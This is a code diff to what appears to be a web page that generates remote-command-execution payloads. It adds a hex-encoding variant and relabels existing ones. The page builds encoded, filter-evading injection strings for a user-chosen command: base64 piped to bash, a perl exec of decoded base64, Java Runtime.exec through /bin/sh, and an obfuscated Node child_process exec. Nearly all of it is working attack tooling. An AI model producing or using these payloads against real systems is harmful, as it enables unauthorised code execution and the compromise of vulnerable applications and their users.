@@ -26,7 +26,7 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_orig
 </textarea>
 
     <textarea id="data2" hidden="true">
-2⃣️ 参数类型 String[]
+2⃣️ 参数类型 String
 参数类型: 字符串
 如 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
 
@@ -41,13 +41,18 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_orig
 
     <textarea id="data3" hidden="true">
 
-3⃣️ 使用base64命令
+3⃣️ base64编码 - 使用base64命令
 支持Linux 不支持macOS
 {echo,arr0w1_base64}|{base64,-d}|bash
 
-4⃣️ 使用perl中的base64语句
+4⃣️ base64编码 - 使用perl中的base64语句
 支持Linux/macOS
-perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'</textarea>
+perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'
+
+5⃣️ hex编码
+支持Linux/macOS
+`echo -e "arr0w1_cmd_ascii2hex"`
+</textarea>
 
     <textarea id="data4" hidden="true">
 如
@@ -115,7 +120,7 @@ require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString
             <br>
             <br>
             3 shell
-            <p class="font-weight-bold">Encoding - base64 </p>
+            <p class="font-weight-bold">Encoding</p>
             <textarea id="payload3" class="form-control" rows="3"></textarea>
 
             <br>
@@ -229,8 +234,7 @@ function ascii_2_Hex(str) {
 
         document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
-        document.getElementById("payload3").value = data3.replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
-
+        document.getElementById("payload3").value = data3.replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );
 
         document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );
 
